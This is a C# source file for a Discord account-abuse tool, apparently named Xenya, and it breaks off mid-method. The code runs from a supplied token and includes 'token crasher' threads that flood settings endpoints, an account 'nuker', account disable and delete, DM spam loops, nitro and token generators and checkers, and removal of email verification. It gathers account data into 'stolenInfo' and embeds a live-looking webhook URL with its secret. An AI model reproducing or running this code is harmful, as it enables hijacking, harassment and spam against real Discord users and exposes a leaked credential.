using Discord;
using Discord.WebSocket;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Xenya.Properties;
public partial class MainForm : MetroFramework.Forms.MetroForm
{
    [DllImport("psapi.dll")]
    static extern int EmptyWorkingSet(IntPtr hwProc);
    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetProcessWorkingSetSize(IntPtr process, UIntPtr minimumWorkingSetSize, UIntPtr maximumWorkingSetSize);
    Discord.WebSocket.DiscordSocketClient theSocketClient;
    Discord.DiscordClient discordClient;
    private bool isBot;
    private int statusValue;
    private string[] formats = { "jpg", "png", "bmp", "jpeg", "jfif", "jpe", "rle", "dib", "svg", "svgz" };
    private string thePath = "", thePath1 = "";
    private int addKickStatus = 0;
    private Thread groupBomber, messageScheduler, massReportBot, serverVocalSpammer, friendMassMessage, renameLooper, addKickLooper, groupSpammer, statusLooper, tokenCrasher1, tokenCrasher2, tokenCrasher3, tokenCrasher4, tokenCrasher5, webhookSpammer, dmMessageSpammer, tokenChecker, accountNuker, nitroGenerator, tokenGenerator, nitroChecker, guildTypingSpammer, guildMessageSpammer, guildJoiner, guildLeaver, addReactionSpammer, removeReactionSpammer, friendSpammer, typingSpammer;
    private List<AClient> loadedSelfBots;
    private bool typingSpammerWorking = false, serverSpammerWorking = false, dmToolWorking = false;
    private string SystemSerialNumber()
    {
        string query = "SELECT * FROM Win32_BaseBoard";
        ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
        foreach (ManagementObject info in searcher.Get())
        {
            return info.GetPropertyValue("SerialNumber").ToString();
        }
        return "";
    }
    private string CpuId()
    {
        string cpuID = string.Empty;
        ManagementClass mc = new ManagementClass("win32_processor");
        ManagementObjectCollection moc = mc.GetInstances();
        foreach (ManagementObject mo in moc)
        {
            if (cpuID == "")
            {
                cpuID = mo.Properties["processorID"].Value.ToString();
            }
        }
        return cpuID;
    }
    public MainForm()
    {
        InitializeComponent();
        CheckForIllegalCrossThreadCalls = false;
        new Thread(new ThreadStart(clearRam)).Start();
        metroTextBox1.Text = Settings.Default.SavedToken;
        metroRadioButton2.Checked = Settings.Default.IsBot;
        try
        {
            DiscordSocketConfig discordSocketConfig = new DiscordSocketConfig();
            discordSocketConfig.MessageCacheSize = 50;
            discordSocketConfig.UdpSocketProvider = Discord.Net.Udp.DefaultUdpSocketProvider.Instance;
            discordSocketConfig.WebSocketProvider = Discord.Net.WebSockets.DefaultWebSocketProvider.Instance;
            theSocketClient = new DiscordSocketClient(discordSocketConfig);
        }
        catch (Exception ex)
        {
        }
        metroTabControl1.SelectedIndex = 0;
        metroComboBox1.SelectedIndex = 0;
        saveFileDialog1.DefaultExt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        saveFileDialog2.DefaultExt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        openFileDialog1.DefaultExt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        openFileDialog2.DefaultExt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string totalString = "All files (*.*)|*.*";
        foreach (string format in formats)
        {
            totalString += "|" + format.ToUpper() + " Image (*." + format + ")|*." + format;
        }
        saveFileDialog1.Filter = totalString;
        openFileDialog1.Filter = totalString;
        try
        {
            theSocketClient.MessageReceived += theSocketClient_MessageReceived;
        }
        catch (Exception ex)
        {
        }
        loadedSelfBots = new List<AClient>();
        new Thread(new ThreadStart(ripperotti)).Start();
        metroComboBox7.SelectedIndex = 0;
        metroComboBox8.SelectedIndex = 0;
        metroComboBox9.SelectedIndex = 0;
        metroComboBox11.SelectedIndex = 0;
        metroComboBox2.SelectedIndex = 0;
    }
    public void ripperotti()
    {
        Thread.Sleep(300);
        metroTabControl1.SelectedIndex = 0;
        Thread.Sleep(1250);
        bool coso = Utils.IsTokenValid(Utils.GetRandomToken());
        Thread.Sleep(1000);
        coso = Discord.REQ.Nitro.Check(Utils.GetRandomNitroCode());
        Thread.Sleep(1000);
        coso = Utils.CheckWebhook("https://discordapp.com/api/webhooks/761202110095687691/5iALg2n3LhS1qL9sfuEP7_s11a6YPWoeXkMCs8nq_rX1IPRstvCA9zo33eggSjOnv5hk");
        Thread.Sleep(500);
    }
    public void clearRam()
    {
        while (true)
        {
            Thread.Sleep(3000);
            EmptyWorkingSet(Process.GetCurrentProcess().Handle);
            GCSettings.LargeObjectHeapCompactionMode = GCLargeObjectHeapCompactionMode.CompactOnce;
            GC.Collect(GC.MaxGeneration);
            GC.WaitForPendingFinalizers();
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, (UIntPtr)0xFFFFFFFF, (UIntPtr)0xFFFFFFFF);
        }
    }
    private void MainForm_FormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
    {
        Settings.Default.SavedToken = metroTextBox1.Text;
        Settings.Default.IsBot = metroRadioButton2.Checked;
        Settings.Default.Save();
        Process.GetCurrentProcess().Kill();
    }
    private async void metroButton1_Click(object sender, EventArgs e)
    {
        try
        {
            setRandomProxy();
            if (metroRadioButton1.Checked)
            {
                await theSocketClient.LoginAsync(TokenType.User, metroTextBox1.Text);
                theSocketClient.MessageReceived += theSocketClient_MessageReceived;
                Thread.Sleep(500);
                await theSocketClient.LoginAsync(TokenType.User, metroTextBox1.Text);
                theSocketClient.MessageReceived += theSocketClient_MessageReceived;
                discordClient = new DiscordClient(metroTextBox1.Text);
            }
            else
            {
                await theSocketClient.LoginAsync(TokenType.Bot, metroTextBox1.Text);
                Thread.Sleep(500);
                await theSocketClient.LoginAsync(TokenType.Bot, metroTextBox1.Text);
            }
            isBot = metroRadioButton2.Checked;
            await theSocketClient.StartAsync();
            MessageBox.Show("Succesfully connected to Discord!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        catch (Exception ex)
        {
            MessageBox.Show("The token is not valid! Can't connect to Discord!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void pictureBox4_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.HypeSquad.SetBalance(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void pictureBox3_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.HypeSquad.SetBravery(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void pictureBox5_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.HypeSquad.SetBrilliance(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void pictureBox6_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.GetClientUser().SetHypesquad(Hypesquad.None);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton2_Click(object sender, EventArgs e)
    {
        try
        {
            if (!isBot)
            {
                if (metroComboBox1.SelectedItem.ToString() == "Online")
                {
                    Discord.REQ.UserProfile.SetOnline(metroTextBox1.Text);
                }
                else if (metroComboBox1.SelectedItem.ToString() == "Idle")
                {
                    Discord.REQ.UserProfile.SetIdle(metroTextBox1.Text);
                }
                else if (metroComboBox1.SelectedItem.ToString() == "Do Not Disturb")
                {
                    Discord.REQ.UserProfile.SetDND(metroTextBox1.Text);
                }
                else if (metroComboBox1.SelectedItem.ToString() == "Invisible")
                {
                    Discord.REQ.UserProfile.SetOffline(metroTextBox1.Text);
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton3_Click(object sender, EventArgs e)
    {
        try
        {
            statusValue = 0;
            metroButton3.Enabled = false;
            statusLooper = new Thread(new ThreadStart(doStatusLooper));
            statusLooper.Start();
            metroButton4.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton4_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton4.Enabled = false;
            statusLooper.Abort();
            metroButton3.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doStatusLooper()
    {
        try
        {
            while (true)
            {
                if (statusValue == 0)
                {
                    Discord.REQ.UserProfile.SetOnline(metroTextBox1.Text);
                }
                else if (statusValue == 1)
                {
                    Discord.REQ.UserProfile.SetIdle(metroTextBox1.Text);
                }
                else if (statusValue == 2)
                {
                    Discord.REQ.UserProfile.SetDND(metroTextBox1.Text);
                }
                else if (statusValue == 3)
                {
                    Discord.REQ.UserProfile.SetOffline(metroTextBox1.Text);
                }
                if (statusValue == 3)
                {
                    statusValue = 0;
                }
                else
                {
                    statusValue += 1;
                }
                Thread.Sleep((int)numericUpDown1.Value);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton5_Click(object sender, EventArgs e)
    {
        try
        {
            if (theSocketClient.CurrentUser.IsVerified)
            {
                MessageBox.Show("This account is verified!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("This account is not verified!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("This account is not verified!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton6_Click(object sender, EventArgs e)
    {
        try
        {
            if (theSocketClient.CurrentUser.IsMfaEnabled)
            {
                MessageBox.Show("This account has 2FA enabled!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("This account has not 2FA enabled!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("This account has not 2FA enabled!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton7_Click(object sender, EventArgs e)
    {
        try
        {
            if (metroRadioButton4.Checked)
            {
                theSocketClient.SetGameAsync(metroTextBox2.Text);
            }
            else
            {
                theSocketClient.SetGameAsync(metroTextBox2.Text, metroTextBox3.Text, StreamType.Twitch);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton9_Click(object sender, EventArgs e)
    {
        try
        {
            Utils.RemoveEmailVerification(discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton8_Click(object sender, EventArgs e)
    {
        try
        {
            System.Windows.Forms.Clipboard.SetText(Utils.GetLagString());
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton10_Click(object sender, EventArgs e)
    {
        try
        {
            if (!isBot)
            {
                Discord.REQ.UserProfile.SetUsername(metroTextBox4.Text, theSocketClient.CurrentUser.Email, metroTextBox5.Text, theSocketClient.CurrentUser.Discriminator, discordClient.Token);
            }
            else
            {
                theSocketClient.CurrentUser.ModifyAsync(x =>
                {
                    x.Username = metroTextBox4.Text;
                });
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton11_Click(object sender, EventArgs e)
    {
        try
        {
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                pictureBox7.BackgroundImage.Save(saveFileDialog1.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton12_Click(object sender, EventArgs e)
    {
        try
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                thePath = openFileDialog1.FileName;
                pictureBox7.BackgroundImage = System.Drawing.Image.FromFile(openFileDialog1.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton13_Click(object sender, EventArgs e)
    {
        try
        {
            theSocketClient.CurrentUser.ModifyAsync(x =>
            {
                x.Avatar = new Image(thePath);
            });
        }
        catch (Exception ex)
        {
        }
    }
    private void metroTabControl1_SelectedIndexChanged(object sender, EventArgs e)
    {
        try
        {
            if (metroTabControl1.SelectedIndex == 1)
            {
                System.Net.WebClient webClient = new System.Net.WebClient();
                pictureBox7.BackgroundImage = System.Drawing.Image.FromStream(new System.IO.MemoryStream(webClient.DownloadData(theSocketClient.CurrentUser.GetAvatarUrl())));
                thePath1 = "";
            }
            else if (metroTabControl1.SelectedIndex == 7)
            {
                thePath = "";
                thePath1 = "";
                refreshManageGuilds2();
            }
            else if (metroTabControl1.SelectedIndex == 6)
            {
                thePath = "";
                thePath1 = "";
                refreshManageGuilds1();
            }
            else if (metroTabControl1.SelectedIndex == 3)
            {
                thePath = "";
                thePath1 = "";
                listBox2.Items.Clear();
                listBox1.Items.Clear();
                refreshGroups();
            }
            else
            {
                thePath = "";
                thePath1 = "";
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void refreshManageGuilds2()
    {
        try
        {
            metroComboBox3.Items.Clear();
            listBox3.Items.Clear();
            listBox4.Items.Clear();
            listBox5.Items.Clear();
            foreach (SocketGuild socketGuild in theSocketClient.Guilds)
            {
                metroComboBox3.Items.Add(socketGuild.Name);
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void refreshGroups()
    {
        try
        {
            listBox1.Items.Clear();
            foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
            {
                try
                {
                    listBox1.Items.Add(socketGroupChannel.Name);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void refreshUsersGroup()
    {
        try
        {
            listBox2.Items.Clear();
            foreach (SocketUser socketUser in getIndexedGroup(listBox1.SelectedIndex).Users)
            {
                listBox2.Items.Add(socketUser.Username + "#" + socketUser.Discriminator);
            }
            pictureBox10.BackgroundImage = discordClient.GetChannel(getIndexedGroup(listBox1.SelectedIndex).Id).ToGroup().Icon.Download(DiscordCDNImageFormat.PNG).Image;
        }
        catch (Exception ex)
        {
        }
    }
    public SocketGroupChannel getIndexedGroup(int index)
    {
        foreach (SocketGroupChannel socketGroupChannel in theSocketClient.GroupChannels)
        {
            try
            {
                if (listBox1.Items[index].ToString() == socketGroupChannel.Name)
                {
                    return socketGroupChannel;
                }
            }
            catch (Exception ex)
            {
            }
        }
        return null;
    }
    public SocketUser getIndexedGroupUser(SocketGroupChannel group, int index)
    {
        int i = 0;
        foreach (SocketUser socketUser in group.Users)
        {
            if (i == index)
            {
                return socketUser;
            }
            i++;
        }
        return null;
    }
    public void refreshManageGuilds1()
    {
        try
        {
            metroComboBox4.Items.Clear();
            metroComboBox5.Items.Clear();
            metroComboBox6.Items.Clear();
            pictureBox9.BackgroundImage = null;
            foreach (SocketGuild socketGuild in theSocketClient.Guilds)
            {
                metroComboBox4.Items.Add(socketGuild.Name);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton14_Click(object sender, EventArgs e)
    {
        try
        {
            if (!isBot)
            {
                string stolenInfo = Discord.REQ.UserProfile.GetBruteInfo(metroTextBox1.Text);
                stolenInfo = stolenInfo.Replace("{\"", "").Replace("}", "").Replace("\",", Environment.NewLine).Replace("\":", ":").Replace("\"", "").Replace(", ", Environment.NewLine);
                var textboxona = new TextBox() { Text = stolenInfo };
                string newStolen = "";
                foreach (string line in textboxona.Lines)
                {
                    string newLine = line;
                    if (newLine.StartsWith(" "))
                    {
                        newLine = newLine.Substring(1, newLine.Length - 1);
                    }
                    if (string.IsNullOrEmpty(newStolen))
                    {
                        newStolen = newLine;
                    }
                    else
                    {
                        newStolen += Environment.NewLine + newLine;
                    }
                }
                newStolen += Environment.NewLine + "token: " + metroTextBox1.Text + Environment.NewLine + "complete username: " + Discord.REQ.UserProfile.UserName(metroTextBox1.Text) + "#" + Discord.REQ.UserProfile.Discriminator(metroTextBox1.Text);
                newStolen += Environment.NewLine + "bot: " + theSocketClient.CurrentUser.IsBot.ToString() + Environment.NewLine + "status: " + theSocketClient.CurrentUser.Status.ToString() + Environment.NewLine + "created at: " + theSocketClient.CurrentUser.CreatedAt.ToString() + Environment.NewLine + "mention: " + theSocketClient.CurrentUser.Mention.ToString() + Environment.NewLine + "language: " + discordClient.GetClientUser().Language.ToString() + Environment.NewLine + "avatar url: " + theSocketClient.CurrentUser.GetAvatarUrl() + Environment.NewLine + "hypesquad: " + discordClient.GetClientUser().Hypesquad.ToString() + Environment.NewLine + "nitro: " + discordClient.GetClientUser().Nitro.ToString() + "badges: " + discordClient.GetClientUser().Badges.ToString() + Environment.NewLine + "public badges: " + discordClient.GetClientUser().PublicBadges.ToString();
                metroTextBox6.Text = newStolen;
            }
            else
            {
                metroTextBox6.Text = "id: " + theSocketClient.CurrentUser.Id.ToString() + Environment.NewLine + "avatar id: " + theSocketClient.CurrentUser.AvatarId.ToString() + Environment.NewLine + "created at: " + theSocketClient.CurrentUser.CreatedAt.ToString() + Environment.NewLine + "discriminator: " + theSocketClient.CurrentUser.Discriminator + Environment.NewLine + "email: " + theSocketClient.CurrentUser.Email + Environment.NewLine + "bot: " + theSocketClient.CurrentUser.IsBot.ToString() + Environment.NewLine + "2fa enabled: " + theSocketClient.CurrentUser.IsMfaEnabled.ToString() + Environment.NewLine + "verified: " + theSocketClient.CurrentUser.IsVerified.ToString() + Environment.NewLine + "mention: " + theSocketClient.CurrentUser.Mention.ToString() + Environment.NewLine + "status: " + theSocketClient.CurrentUser.Status.ToString() + Environment.NewLine + "username: " + theSocketClient.CurrentUser.Username.ToString() + Environment.NewLine + "token: " + metroTextBox1.Text + Environment.NewLine + "complete username: " + theSocketClient.CurrentUser.Username.ToString() + "#" + theSocketClient.CurrentUser.Discriminator.ToString();
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton16_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.UserSettings.SetDevelopperModeON(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton15_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.UserSettings.SetDevelopperModeOFF(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton18_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.UserSettings.SetDisplayCompactON(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton17_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.UserSettings.SetDisplayCompactOFF(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton20_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.UserSettings.SetThemeLight(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton19_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.UserSettings.SetThemeDark(metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton21_Click(object sender, EventArgs e)
    {
        try
        {
            string[] languages = { "da", "de", "en", "es", "fr", "hr", "it", "lt", "hu", "nl", "no", "pl", "pt", "ro", "fi", "sv", "vi", "tr", "cs", "el", "bg", "ru", "uk", "hi", "th", "zh", "jp", "kr" };
            Discord.REQ.UserSettings.SetLanguage(languages[metroComboBox2.SelectedIndex], discordClient.Token);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton22_Click(object sender, EventArgs e)
    {
        try
        {
            if (Discord.REQ.Nitro.Check(metroTextBox7.Text))
            {
                MessageBox.Show("This nitro code is valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("This nitro code is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("This nitro code is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton23_Click(object sender, EventArgs e)
    {
        try
        {
            if (Discord.REQ.Nitro.Check(metroTextBox8.Text))
            {
                Discord.REQ.Nitro.Claim(metroTextBox8.Text, metroTextBox1.Text);
                MessageBox.Show("This nitro code is valid and has been claimed!", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("This nitro code is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("This nitro code is not valid!", Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
    private void metroButton50_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.GetClientUser().Disable(metroTextBox44.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton49_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.GetClientUser().Delete(metroTextBox44.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton51_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (ClientConnectedAccount connectedAccount in discordClient.GetConnectedAccounts())
            {
                try
                {
                    connectedAccount.Remove();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton52_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (OAuth2Application application in discordClient.GetApplications())
            {
                try
                {
                    application.Delete();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton53_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton53.Enabled = false;
            tokenCrasher1 = new Thread(new ThreadStart(doTokenCrasher1));
            tokenCrasher1.Start();
            tokenCrasher2 = new Thread(new ThreadStart(doTokenCrasher2));
            tokenCrasher2.Start();
            tokenCrasher3 = new Thread(new ThreadStart(doTokenCrasher3));
            tokenCrasher3.Start();
            tokenCrasher4 = new Thread(new ThreadStart(doTokenCrasher4));
            tokenCrasher4.Start();
            tokenCrasher5 = new Thread(new ThreadStart(doTokenCrasher5));
            tokenCrasher5.Start();
            metroButton54.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton54_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton54.Enabled = false;
            tokenCrasher1.Abort();
            tokenCrasher2.Abort();
            tokenCrasher3.Abort();
            tokenCrasher4.Abort();
            tokenCrasher5.Abort();
            metroButton53.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    public void doTokenCrasher4()
    {
        try
        {
            while (true)
            {
                try
                {
                    Discord.REQ.UserSettings.SetDisplayCompactON(metroTextBox1.Text);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doTokenCrasher5()
    {
        try
        {
            while (true)
            {
                try
                {
                    Discord.REQ.UserSettings.SetDisplayCompactOFF(metroTextBox1.Text);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doTokenCrasher1()
    {
        try
        {
            while (true)
            {
                try
                {
                    Discord.REQ.UserSettings.SetThemeLight(metroTextBox1.Text);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doTokenCrasher2()
    {
        try
        {
            while (true)
            {
                try
                {
                    Discord.REQ.UserSettings.SetThemeDark(metroTextBox1.Text);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void doTokenCrasher3()
    {
        try
        {
            while (true)
            {
                try
                {
                    string[] languages = { "de", "jp", "kr", "fi", "da", "zh" };
                    Discord.REQ.UserSettings.SetLanguage(languages[Utils.GetRandomNumber(6)], discordClient.Token);
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton39_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.GetUser(ulong.Parse(metroTextBox14.Text)).SendFriendRequest();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton40_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.GetUser(ulong.Parse(metroTextBox14.Text)).RemoveRelationship();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton41_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.GetUser(ulong.Parse(metroTextBox14.Text)).Block();
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton42_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.RelationShip.UnBlockUser(metroTextBox14.Text, metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton43_Click(object sender, EventArgs e)
    {
        try
        {
            theSocketClient.GetUser(ulong.Parse(metroTextBox14.Text)).SendMessageAsync(metroTextBox15.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton44_Click(object sender, EventArgs e)
    {
        try
        {
            Discord.REQ.RelationShip.SetNote(metroTextBox16.Text, metroTextBox14.Text, metroTextBox1.Text);
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton46_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton46.Enabled = false;
            dmMessageSpammer = new Thread(new ThreadStart(doDMMessageSpammer));
            dmMessageSpammer.Start();
            metroButton45.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton45_Click(object sender, EventArgs e)
    {
        try
        {
            metroButton45.Enabled = false;
            dmMessageSpammer.Abort();
            metroButton46.Enabled = true;
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton47_Click(object sender, EventArgs e)
    {
        try
        {
            try
            {
                if (!isBot)
                {
                    System.Net.WebClient webClient = new System.Net.WebClient();
                    string stolenInfo = Discord.REQ.UserProfile.GetUser(metroTextBox14.Text, metroTextBox1.Text);
                    stolenInfo = stolenInfo.Replace("{\"", "").Replace("}", "").Replace("\",", Environment.NewLine).Replace("\":", ":").Replace("\"", "").Replace(", ", Environment.NewLine);
                    var textboxona = new TextBox() { Text = stolenInfo };
                    string newStolen = "";
                    foreach (string line in textboxona.Lines)
                    {
                        string newLine = line;
                        if (newLine.StartsWith(" "))
                        {
                            newLine = newLine.Substring(1, newLine.Length - 1);
                        }
                        if (string.IsNullOrEmpty(newStolen))
                        {
                            newStolen = newLine;
                        }
                        else
                        {
                            newStolen += Environment.NewLine + newLine;
                        }
                    }
                    SocketUser user = theSocketClient.GetUser(ulong.Parse(metroTextBox14.Text));
                    metroTextBox18.Text = newStolen.Replace("]", "").Replace("[", Environment.NewLine) + Environment.NewLine + "status: " + user.Status.ToString() + Environment.NewLine + "mention: " + user.Mention.ToString() + Environment.NewLine + "created at: " + user.CreatedAt.ToString() + Environment.NewLine + "is bot: " + user.IsBot.ToString() + Environment.NewLine + "hypesquad: " + discordClient.GetUser(user.Id).Hypesquad.ToString() + Environment.NewLine + "badges: " + discordClient.GetUser(user.Id).Badges.ToString() + Environment.NewLine + "public badges: " + discordClient.GetUser(user.Id).PublicBadges + Environment.NewLine + "channel id: " + Utils.GetChannelIDByFriendID(discordClient.Token, user.Id.ToString()) + Environment.NewLine + "token: " + Utils.Base64Encode(user.Id.ToString());
                    pictureBox8.BackgroundImage = System.Drawing.Image.FromStream(new System.IO.MemoryStream(webClient.DownloadData(user.GetAvatarUrl())));
                }
                else
                {
                    System.Net.WebClient webClient = new System.Net.WebClient();
                    SocketUser socketUser = theSocketClient.GetUser(ulong.Parse(metroTextBox14.Text));
                    metroTextBox18.Text = "Avatar ID: " + socketUser.AvatarId + Environment.NewLine +
                        "Created at: " + socketUser.CreatedAt.ToString() + Environment.NewLine +
                        "Discriminator: " + socketUser.Discriminator + Environment.NewLine +
                        "Username: " + socketUser.Username + Environment.NewLine +
                        "Status: " + socketUser.Status.ToString() + Environment.NewLine +
                        "Mention: " + socketUser.Mention + Environment.NewLine +
                        "Token: " + Utils.Base64Encode(socketUser.Id.ToString());
                    pictureBox8.BackgroundImage = System.Drawing.Image.FromStream(new System.IO.MemoryStream(webClient.DownloadData(socketUser.GetAvatarUrl())));
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton48_Click(object sender, EventArgs e)
    {
        try
        {
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                pictureBox8.BackgroundImage.Save(saveFileDialog1.FileName);
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroRadioButton13_CheckedChanged(object sender, EventArgs e)
    {
        metroTextBox17.Enabled = metroRadioButton13.Checked;
    }
    private void metroCheckBox6_Click(object sender, EventArgs e)
    {
        metroCheckBox7.Checked = false;
        numericUpDown5.Enabled = true;
    }
    private void metroCheckBox7_Click(object sender, EventArgs e)
    {
        metroCheckBox6.Checked = false;
        numericUpDown5.Enabled = false;
    }
    public void doDMMessageSpammer()
    {
        try
        {
            while (true)
            {
                try
                {
                    string theMessage = metroTextBox17.Text;
                    int theDelay = (int)numericUpDown5.Value;
                    if (metroCheckBox7.Checked)
                    {
                        theDelay = Utils.GetRandomNumber(600, 1200);
                    }
                    if (metroRadioButton11.Checked)
                    {
                        theMessage = Utils.RandomNormalString(1750);
                    }
                    else if (metroRadioButton12.Checked)
                    {
                        theMessage = Utils.RandomChineseString(1750);
                    }
                    else if (metroRadioButton14.Checked)
                    {
                        theMessage = Utils.GetLagString();
                    }
                    Thread.Sleep(theDelay);
                    try
                    {
                        theSocketClient.GetUser(ulong.Parse(metroTextBox14.Text)).SendMessageAsync(theMessage);
                    }
                    catch (Exception ex)
                    {
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton55_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.JoinGuild(Utils.GetInviteCodeByInviteLink(metroTextBox45.Text));
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton56_Click(object sender, EventArgs e)
    {
        try
        {
            discordClient.JoinGroup(Utils.GetInviteCodeByInviteLink(metroTextBox46.Text));
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton57_Click(object sender, EventArgs e)
    {
        try
        {
            if (metroButton57.Text == "Nuke this account")
            {
                metroButton57.Text = "Stop nuking this account";
                accountNuker = new Thread(new ThreadStart(doAccountNuker));
                accountNuker.Start();
            }
            else
            {
                metroButton57.Text = "Nuke this account";
                accountNuker.Abort();
            }
        }
        catch (Exception ex)
        {
        }
    }
    private void metroButton58_Click(object sender, EventArgs e)
    {
        try
        {
            if (metroCheckBox47.Checked)
            {
                string[] theProxy = GetRandomProxy();
                if (Utils.IsTokenValid(metroTextBox47.Text, theProxy[0], theProxy[1]))
                {
